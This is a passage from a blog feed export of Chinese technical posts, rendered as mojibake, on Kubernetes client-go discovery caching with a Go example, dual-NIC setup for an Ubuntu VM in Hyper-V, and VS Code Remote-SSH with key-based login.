mutatingwebhookconfigurations, group: admissionregistration.k8s.io, version: v1beta1<br>name: validatingwebhookconfigurations, group: admissionregistration.k8s.io, version: v1beta1<br>name: customresourcedefinitions, group: apiextensions.k8s.io, version: v1<br>name: customresourcedefinitions/status, group: apiextensions.k8s.io, version: v1<br>name: customresourcedefinitions, group: apiextensions.k8s.io, version: v1beta1<br>name: customresourcedefinitions/status, group: apiextensions.k8s.io, version: v1beta1<br>name: priorityclasses, group: scheduling.k8s.io, version: v1<br>name: priorityclasses, group: scheduling.k8s.io, version: v1beta1<br>name: leases, group: coordination.k8s.io, version: v1<br>name: leases, group: coordination.k8s.io, version: v1beta1<br>name: runtimeclasses, group: node.k8s.io, version: v1beta1<br>name: endpointslices, group: discovery.k8s.io, version: v1beta1<br>name: cukclusters, group: dubhe.welkin, version: v1alpha1<br>name: cukclusters/status, group: dubhe.welkin, version: v1alpha1<br>name: cuknodes, group: dubhe.welkin, version: v1alpha1<br>name: cuknodes/status, group: dubhe.welkin, version: v1alpha1<br>name: cuksets, group: dubhe.welkin, version: v1alpha1<br>name: cuksets/status, group: dubhe.welkin, version: v1alpha1<br>name: nodes, group: metrics.k8s.io, version: v1beta1<br>name: pods, group: metrics.k8s.io, version: v1beta1<br><br></code></pre></td></tr></table></figure><h3 id="å°†GVRç¼“å­˜åˆ°æœ¬åœ°"><a href="#å°†GVRç¼“å­˜åˆ°æœ¬åœ°" class="headerlink" title="å°†GVRç¼“å­˜åˆ°æœ¬åœ°"></a>å°†GVRç¼“å­˜åˆ°æœ¬åœ°</h3><p>å¯ä»¥å‘ç°ï¼ŒGVRæ•°æ®å…¶å®æ˜¯å¾ˆå°‘å˜åŠ¨çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†GVRçš„æ•°æ®ç¼“å­˜åˆ°æœ¬åœ°ï¼Œæ¥å‡å°‘Clientä¸Apiserveräº¤äº’ã€‚</p><p>åœ¨discovery&#x2F;cachedä¸­ï¼Œæœ‰å¦å¤–ä¸¤ä¸ªå®¢æˆ·ç«¯æ˜¯æ¥å®ç°å°†GVRæ•°æ®ç¼“å­˜åˆ°æœ¬åœ°æ–‡ä»¶ä¸­å’Œå†…å­˜ä¸­çš„ï¼Œåˆ†åˆ«æ˜¯CachedDiscoveryClientå’ŒmemCacheClientã€‚</p><p>å¹³æ—¶ç®¡ç†é›†ç¾¤çš„kubectlå‘½ä»¤ä¹Ÿæ˜¯ä½¿ç”¨è¿™ç§æ–¹å¼æ¥ä½¿ç”¨GVRä¸APIServeräº¤äº’çš„ã€‚</p><p>DiscoveryClienté™¤äº†å¯ä»¥å‘ç°Kubernetes API Serveræ‰€æ”¯æŒçš„èµ„æºç»„ã€èµ„æºç‰ˆæœ¬ã€èµ„æºä¿¡æ¯ï¼Œè¿˜å¯ä»¥å°†è¿™äº›ä¿¡æ¯å­˜å‚¨åˆ°æœ¬åœ°ï¼Œç”¨äºæœ¬åœ°ç¼“å­˜ï¼ˆcacheï¼‰ï¼Œä»¥å‡è½»å¯¹Kubernetes API Serverè®¿é—®çš„å‹åŠ›ã€‚åœ¨è¿è¡ŒKubernetesç»„ä»¶çš„æœºå™¨ä¸Šï¼Œç¼“å­˜ä¿¡æ¯é»˜è®¤å­˜å‚¨ä¸<del>&#x2F;.kube&#x2F;cacheå’Œ</del>&#x2F;.kube&#x2F;http-cacheä¸‹ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br><br><span class="hljs-string">&quot;k8s.io/apimachinery/pkg/runtime/schema&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/discovery/cached/disk&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/tools/clientcmd&quot;</span><br>)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">@Author: ningan</span><br><span class="hljs-comment">@Desc: å°†GVRæ•°æ®ç¼“å­˜åˆ°æœ¬åœ°</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 1. åŠ è½½é…ç½®æ–‡ä»¶ï¼Œç”Ÿæˆconfigå¯¹è±¡</span><br>config, err := clientcmd.BuildConfigFromFlags(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;/root/.kube/config&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 2. å®ä¾‹åŒ–å®¢æˆ·ç«¯ï¼Œæœ¬å®¢æˆ·ç«¯è´Ÿè´£å°†GVRæ•°æ®ç¼“å­˜åˆ°æœ¬åœ°æ–‡ä»¶ä¸­</span><br>cachedDiscoveryClient, err := disk.NewCachedDiscoveryClientForConfig(config, <span class="hljs-string">&quot;./cache/discovery&quot;</span>, <span class="hljs-string">&quot;./cache/http&quot;</span>, time.Minute*<span class="hljs-number">60</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br>_, apiResourcesList, err := cachedDiscoveryClient.ServerGroupsAndResources()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1) å…ˆä»ç¼“å­˜æ–‡ä»¶ä¸­æ‰¾GVRæ•°æ®ï¼Œæœ‰åˆ™ç›´æ¥è¿”å›ï¼Œæ²¡æœ‰åˆ™è°ƒç”¨APIServer</span><br><span class="hljs-comment">2) å—²ç”¨APIServerè·å–GVRæ•°æ®</span><br><span class="hljs-comment">3) å°†è·å–åˆ°çš„GVRæ•°æ®ç¼“å­˜åˆ°æœ¬åœ°ï¼Œç„¶åè¿”å›ç»™å®¢æˆ·ç«¯</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">for</span> _, list := <span class="hljs-keyword">range</span> apiResourcesList &#123;<br>gv, err := schema.ParseGroupVersion(list.GroupVersion)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-keyword">for</span> _, resource := <span class="hljs-keyword">range</span> list.APIResources &#123;<br>fmt.Printf(<span class="hljs-string">&quot;name: %v, group: %v, version: %v\n&quot;</span>, resource.Name, gv.Group, gv.Version)<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œgo run main.goä¹‹åï¼Œç¡®å®ç”Ÿæˆäº†cacheç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master demo2]<span class="hljs-comment"># tree -L 2</span><br>.<br>â”œâ”€â”€ cache<br>â”‚Â Â  â”œâ”€â”€ discovery<br>â”‚Â Â  â””â”€â”€ http<br>â””â”€â”€ main.go<br><br>3 directories, 1 file<br><br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p>Kubernetesæºç å‰–æ 5.2èŠ‚ Clientå®¢æˆ·ç«¯å¯¹è±¡</p><p>bç«™è§†é¢‘ï¼š<a href="https://www.bilibili.com/video/BV11e4y197Ft/?spm_id_from=pageDriver&vd_source=504b7dbe5398664dd37d144b1bdfc0a1">Client-goå®æˆ˜æ•™ç¨‹</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
      <tag>client-go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘(202207) hypervä¸­çš„ubuntuè™šæ‹ŸæœºåŒç½‘å¡è®¾ç½®</title>
    <link href="/2022/07/25/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202207)%20hyperv%E4%B8%AD%E7%9A%84ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE/"/>
    <url>/2022/07/25/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202207)%20hyperv%E4%B8%AD%E7%9A%84ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h2><p>hypervåˆ›å»ºè™šæ‹Ÿæœºçš„æ—¶å€™ï¼Œé»˜è®¤ç”¨çš„æ˜¯default switchï¼Œè¿™ä¸ªdefault switchç”Ÿæˆçš„ipv4åœ°å€æ˜¯å˜åŒ–çš„</p><h2 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h2><p>æœ‰ä¸€ä¸ªä¸å˜çš„ipv4åœ°å€ï¼Œæ–¹ä¾¿sshè¿œç¨‹è¿æ¥</p><p>åŒæ—¶è¿˜å¯ä»¥è¿æ¥å¤–ç½‘</p><h2 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h2><p>hypervåŒæ—¶æ•´ä¸¤ä¸ªç½‘å¡ï¼Œä¸€ä¸ªç½‘å¡(æ–°å»ºä¸€ä¸ªå†…éƒ¨çš„ç½‘å¡)é…ç½®é™æ€ipåœ°å€ï¼Œä¸€ä¸ªç½‘å¡(default switch)ç”¨äºè¿å¤–ç½‘</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725233717830.png" alt="image-20220725233717830"></p><h3 id="ä¸»æœºç½‘å¡é…ç½®"><a href="#ä¸»æœºç½‘å¡é…ç½®" class="headerlink" title="ä¸»æœºç½‘å¡é…ç½®"></a>ä¸»æœºç½‘å¡é…ç½®</h3><p>default switchä¸åšä»»ä½•æ›´æ”¹ï¼Œä½¿ç”¨é»˜è®¤é…ç½®ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726000455898.png" alt="image-20220726000455898"></p><p>æ–°å»ºçš„å†…éƒ¨ç½‘å¡ï¼Œé…ç½®ä¸ºè‡ªå®šä¹‰çš„ä¸œè¥¿</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726000604540.png" alt="image-20220726000604540"></p><h3 id="è™šæ‹Ÿæœºç½‘å¡é…ç½®"><a href="#è™šæ‹Ÿæœºç½‘å¡é…ç½®" class="headerlink" title="è™šæ‹Ÿæœºç½‘å¡é…ç½®"></a>è™šæ‹Ÿæœºç½‘å¡é…ç½®</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726000941694.png" alt="image-20220726000941694"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001702691.png" alt="image-20220726001702691"></p><p>eth0ä¸åšæ›´æ”¹</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001057558.png" alt="image-20220726001057558"></p><p>eth1æ”¹æˆè‡ªå®šä¹‰ipåœ°å€</p><p>ä¸ºä»€ä¹ˆæ­¤å¤„ä¸å†™ç½‘å…³å‘¢ï¼Ÿå› ä¸ºä¸éœ€è¦è¿æ¥å¤–ç½‘</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001158509.png" alt="image-20220726001158509"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001316264.png" alt="image-20220726001316264"></p><p>æˆåŠŸç”¨è‡ªå·±åŠ çš„ç½‘å¡å¯¹åº”çš„é™æ€ipåœ°å€è¿›è¡Œsshè¿æ¥ï¼Œæå®šï¼</p><p>æ­¤å¤„ï¼Œæ„Ÿè°¢å°ç‹çš„æŒ‡å¯¼ï¼Œæ¯”å¿ƒï¼ æ¯”â™¥</p><h1 id="â€”â€”â€“2022-08-14â€”â€”â€“"><a href="#â€”â€”â€“2022-08-14â€”â€”â€“" class="headerlink" title="â€”â€”â€“2022.08.14â€”â€”â€“"></a>â€”â€”â€“2022.08.14â€”â€”â€“</h1><h2 id="ubuntu18-04åŒç½‘å¡è®¾ç½®"><a href="#ubuntu18-04åŒç½‘å¡è®¾ç½®" class="headerlink" title="ubuntu18.04åŒç½‘å¡è®¾ç½®"></a>ubuntu18.04åŒç½‘å¡è®¾ç½®</h2><p>éœ€è¦ç”¨ä¸¤ä¸ªprofile</p><p>è¦ä¸ç„¶è¿™ä¸¤ä¸ªç½‘å¡å°±åªæœ‰ä¸€ä¸ªç”Ÿæ•ˆï¼Œä¸èƒ½åŒæ—¶ç”Ÿæ•ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814233149347.png" alt="image-20220814233149347"></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€è™šæ‹Ÿæœºã€‘(202207) hypervä¸­çš„ubuntuè™šæ‹ŸæœºåŒç½‘å¡è®¾ç½®</title>
    <link href="/2022/07/25/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202207)%20hyperv%E4%B8%AD%E7%9A%84ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE/"/>
    <url>/2022/07/25/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202207)%20hyperv%E4%B8%AD%E7%9A%84ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%8F%8C%E7%BD%91%E5%8D%A1%E8%AE%BE%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h2><p>hypervåˆ›å»ºè™šæ‹Ÿæœºçš„æ—¶å€™ï¼Œé»˜è®¤ç”¨çš„æ˜¯default switchï¼Œè¿™ä¸ªdefault switchç”Ÿæˆçš„ipv4åœ°å€æ˜¯å˜åŒ–çš„</p><h2 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h2><p>æœ‰ä¸€ä¸ªä¸å˜çš„ipv4åœ°å€ï¼Œæ–¹ä¾¿sshè¿œç¨‹è¿æ¥</p><p>åŒæ—¶è¿˜å¯ä»¥è¿æ¥å¤–ç½‘</p><h2 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h2><p>hypervåŒæ—¶æ•´ä¸¤ä¸ªç½‘å¡ï¼Œä¸€ä¸ªç½‘å¡(æ–°å»ºä¸€ä¸ªå†…éƒ¨çš„ç½‘å¡)é…ç½®é™æ€ipåœ°å€ï¼Œä¸€ä¸ªç½‘å¡(default switch)ç”¨äºè¿å¤–ç½‘</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725233717830.png" alt="image-20220725233717830"></p><h3 id="ä¸»æœºç½‘å¡é…ç½®"><a href="#ä¸»æœºç½‘å¡é…ç½®" class="headerlink" title="ä¸»æœºç½‘å¡é…ç½®"></a>ä¸»æœºç½‘å¡é…ç½®</h3><p>default switchä¸åšä»»ä½•æ›´æ”¹ï¼Œä½¿ç”¨é»˜è®¤é…ç½®ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726000455898.png" alt="image-20220726000455898"></p><p>æ–°å»ºçš„å†…éƒ¨ç½‘å¡ï¼Œé…ç½®ä¸ºè‡ªå®šä¹‰çš„ä¸œè¥¿</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726000604540.png" alt="image-20220726000604540"></p><h3 id="è™šæ‹Ÿæœºç½‘å¡é…ç½®"><a href="#è™šæ‹Ÿæœºç½‘å¡é…ç½®" class="headerlink" title="è™šæ‹Ÿæœºç½‘å¡é…ç½®"></a>è™šæ‹Ÿæœºç½‘å¡é…ç½®</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726000941694.png" alt="image-20220726000941694"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001702691.png" alt="image-20220726001702691"></p><p>eth0ä¸åšæ›´æ”¹</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001057558.png" alt="image-20220726001057558"></p><p>eth1æ”¹æˆè‡ªå®šä¹‰ipåœ°å€</p><p>ä¸ºä»€ä¹ˆæ­¤å¤„ä¸å†™ç½‘å…³å‘¢ï¼Ÿå› ä¸ºä¸éœ€è¦è¿æ¥å¤–ç½‘</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001158509.png" alt="image-20220726001158509"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220726001316264.png" alt="image-20220726001316264"></p><p>æˆåŠŸç”¨è‡ªå·±åŠ çš„ç½‘å¡å¯¹åº”çš„é™æ€ipåœ°å€è¿›è¡Œsshè¿æ¥ï¼Œæå®šï¼</p><p>æ­¤å¤„ï¼Œæ„Ÿè°¢å°ç‹çš„æŒ‡å¯¼ï¼Œæ¯”å¿ƒï¼ æ¯”â™¥</p><h1 id="â€”â€”â€“2022-08-14â€”â€”â€“"><a href="#â€”â€”â€“2022-08-14â€”â€”â€“" class="headerlink" title="â€”â€”â€“2022.08.14â€”â€”â€“"></a>â€”â€”â€“2022.08.14â€”â€”â€“</h1><h2 id="ubuntu18-04åŒç½‘å¡è®¾ç½®"><a href="#ubuntu18-04åŒç½‘å¡è®¾ç½®" class="headerlink" title="ubuntu18.04åŒç½‘å¡è®¾ç½®"></a>ubuntu18.04åŒç½‘å¡è®¾ç½®</h2><p>éœ€è¦ç”¨ä¸¤ä¸ªprofile</p><p>è¦ä¸ç„¶è¿™ä¸¤ä¸ªç½‘å¡å°±åªæœ‰ä¸€ä¸ªç”Ÿæ•ˆï¼Œä¸èƒ½åŒæ—¶ç”Ÿæ•ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814233149347.png" alt="image-20220814233149347"></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€vscodeã€‘Windowsä¸‹å¦‚ä½•ä½¿ç”¨VScodeè¿æ¥è¿œç¨‹linuxæœåŠ¡å™¨è¿›è¡Œè¿œç¨‹å¼€å‘</title>
    <link href="/2022/07/25/software/%E3%80%90%E9%9C%80%E8%A6%81%E6%94%B9%E6%97%B6%E9%97%B4%E3%80%91%E3%80%90vscode%E3%80%91Windows%E4%B8%8B%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8VScode%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8Blinux%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    <url>/2022/07/25/software/%E3%80%90%E9%9C%80%E8%A6%81%E6%94%B9%E6%97%B6%E9%97%B4%E3%80%91%E3%80%90vscode%E3%80%91Windows%E4%B8%8B%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8VScode%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8Blinux%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<p>release author: ningan123</p><p>release time: 2022-05-05</p><h2 id="1-å…ˆä¸Šæ‰‹-æˆåŠŸè¿æ¥"><a href="#1-å…ˆä¸Šæ‰‹-æˆåŠŸè¿æ¥" class="headerlink" title="1. å…ˆä¸Šæ‰‹-æˆåŠŸè¿æ¥"></a>1. å…ˆä¸Šæ‰‹-æˆåŠŸè¿æ¥</h2><h3 id="1-vscodeä¸‹è½½å®‰è£…æ‰€éœ€æ’ä»¶ï¼švscodeä¸­çš„remote-sshæ’ä»¶"><a href="#1-vscodeä¸‹è½½å®‰è£…æ‰€éœ€æ’ä»¶ï¼švscodeä¸­çš„remote-sshæ’ä»¶" class="headerlink" title="1.vscodeä¸‹è½½å®‰è£…æ‰€éœ€æ’ä»¶ï¼švscodeä¸­çš„remote-sshæ’ä»¶"></a>1.vscodeä¸‹è½½å®‰è£…æ‰€éœ€æ’ä»¶ï¼švscodeä¸­çš„remote-sshæ’ä»¶</h3><p><img src="https://img-blog.csdnimg.cn/3b127ff942f64d9cba9a926ae897847c.png" alt="img"></p><p>å®‰è£…ä¹‹åï¼Œå°±ä¼šå‡ºç°ä¸Šå›¾é»„è‰²æ‰€ç¤ºçš„å›¾æ ‡</p><h3 id="2-ç‚¹å‡»è¿œç¨‹å›¾æ ‡ä¸­çš„é…ç½®æŒ‰é’®ï¼Œé€‰æ‹©configæ–‡ä»¶"><a href="#2-ç‚¹å‡»è¿œç¨‹å›¾æ ‡ä¸­çš„é…ç½®æŒ‰é’®ï¼Œé€‰æ‹©configæ–‡ä»¶" class="headerlink" title="2.ç‚¹å‡»è¿œç¨‹å›¾æ ‡ä¸­çš„é…ç½®æŒ‰é’®ï¼Œé€‰æ‹©configæ–‡ä»¶"></a>2.ç‚¹å‡»è¿œç¨‹å›¾æ ‡ä¸­çš„é…ç½®æŒ‰é’®ï¼Œé€‰æ‹©configæ–‡ä»¶</h3><p><img src="https://img-blog.csdnimg.cn/88b2ecaacca4469cad2f1c0ed547f6d3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="3-é…ç½®configæ–‡ä»¶"><a href="#3-é…ç½®configæ–‡ä»¶" class="headerlink" title="3.é…ç½®configæ–‡ä»¶"></a>3.é…ç½®configæ–‡ä»¶</h3><p><img src="https://img-blog.csdnimg.cn/97880d2fc46749dd9f00248e88db9854.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>Hostéƒ¨åˆ†è¾“å…¥æœåŠ¡å™¨çš„å¤–å·ï¼ˆå¦‚â€œtestâ€ï¼‰<br>HostNameéƒ¨åˆ†è¾“å…¥æœåŠ¡å™¨çš„åœ°å€<br>Useréƒ¨åˆ†è¾“å…¥ç”¨æˆ·çš„åç§°</p><p>configæ–‡ä»¶ä¸­å†™çš„Hoståç§°testå°±ä¼šæ˜¾ç¤ºåœ¨æœ€å·¦ä¾§ã€‚</p><p><img src="https://img-blog.csdnimg.cn/31e20e20cd04429b8d232bffb40b9c61.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="4-æ–°å»ºçª—å£è¿æ¥"><a href="#4-æ–°å»ºçª—å£è¿æ¥" class="headerlink" title="4.æ–°å»ºçª—å£è¿æ¥"></a>4.æ–°å»ºçª—å£è¿æ¥</h3><p>æ­¤æ—¶ï¼Œå•å‡»â€œæ–°å»ºè¿æ¥â€æŒ‰é’®ï¼Œvscodeä¼šé‡æ–°æ‰“å¼€ä¸€ä¸ªçª—å£ï¼Œæç¤ºè¾“å…¥è¿œç¨‹æœåŠ¡å™¨çš„å¯†ç ã€‚<br><img src="https://img-blog.csdnimg.cn/9759c53f6ac440c5b8849dd5907d0b11.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/fa51d90355ce49f19f5c46ff09d3ab71.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="2-è¿›é˜¶ç‰ˆ-å…å¯†"><a href="#2-è¿›é˜¶ç‰ˆ-å…å¯†" class="headerlink" title="2. è¿›é˜¶ç‰ˆ-å…å¯†"></a>2. è¿›é˜¶ç‰ˆ-å…å¯†</h2><p>ä¸Šé¢çš„æ–¹å¼æ¯æ¬¡è¿æ¥ä¸»æœºéƒ½éœ€è¦è¾“å…¥å¯†ç ï¼Œä¸ºäº†ç®€åŒ–æ“ä½œï¼Œä½¿ç”¨å…¬é’¥è¿›è¡Œå…å¯†ç™»å½•ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">linuxæœåŠ¡å™¨ï¼š<br>[root@<span class="hljs-built_in">test</span> ~]$ <span class="hljs-built_in">mkdir</span> .ssh<br>[root@<span class="hljs-built_in">test</span> ~]$ <span class="hljs-built_in">cd</span> .ssh<br>[root@<span class="hljs-built_in">test</span> .ssh]$ vi authorized_keys<br><span class="hljs-comment">#æ­¤å¤„è¾“å…¥windowsçš„.../.ssh/id_rsa.pubå†…å®¹</span><br>[root@<span class="hljs-built_in">test</span> .ssh]$ <span class="hljs-built_in">chmod</span> 600 authorized_keys<br><br>windowsä¸‹çš„vscodeï¼š<br>ç›´æ¥ç‚¹å‡»æ–°å»ºçª—å£ï¼Œå³å¯æˆåŠŸå…å¯†è·³è½¬ï¼<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘hypervåˆ›å»ºubuntu20.10è™šæ‹Ÿæœº</title>
    <link href="/2022/07/25/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91hyperv%E5%88%9B%E5%BB%BAubuntu20.10%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    <url>/2022/07/25/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91hyperv%E5%88%9B%E5%BB%BAubuntu20.10%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p><font color=red>ä¸‹é¢ä»¥20.10ä¸ºä¾‹ï¼š (18.04åœ¨åé¢ï¼Œåªåšäº†éƒ¨åˆ†ä¿®æ”¹)</font></p><h2 id="å‡†å¤‡å·¥ä½œ-é•œåƒä¸‹è½½"><a href="#å‡†å¤‡å·¥ä½œ-é•œåƒä¸‹è½½" class="headerlink" title="å‡†å¤‡å·¥ä½œ é•œåƒä¸‹è½½"></a>å‡†å¤‡å·¥ä½œ é•œåƒä¸‹è½½</h2><p><a href="https://old-releases.ubuntu.com/releases/20.10/">Ubuntu 20.10 (Groovy Gorilla)</a></p><h2 id="æ“ä½œæ­¥éª¤-æˆåŠŸåˆ›å»º"><a href="#æ“ä½œæ­¥éª¤-æˆåŠŸåˆ›å»º" class="headerlink" title="æ“ä½œæ­¥éª¤(æˆåŠŸåˆ›å»º)"></a>æ“ä½œæ­¥éª¤(æˆåŠŸåˆ›å»º)</h2><p>å¼€å§‹-&gt;è®¾ç½®-&gt;åº”ç”¨-&gt;ç¨‹åºå’ŒåŠŸèƒ½-&gt;å¯ç”¨æˆ–å…³é—­WindowsåŠŸèƒ½ã€‚<br>åœ¨æ‰“å¼€çš„çª—å£ä¸­ï¼Œé€‰æ‹©â€œHyper-Vâ€</p><p>æ–°å»ºè™šæ‹Ÿæœºï¼Œæµç¨‹å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220725165812170.png" 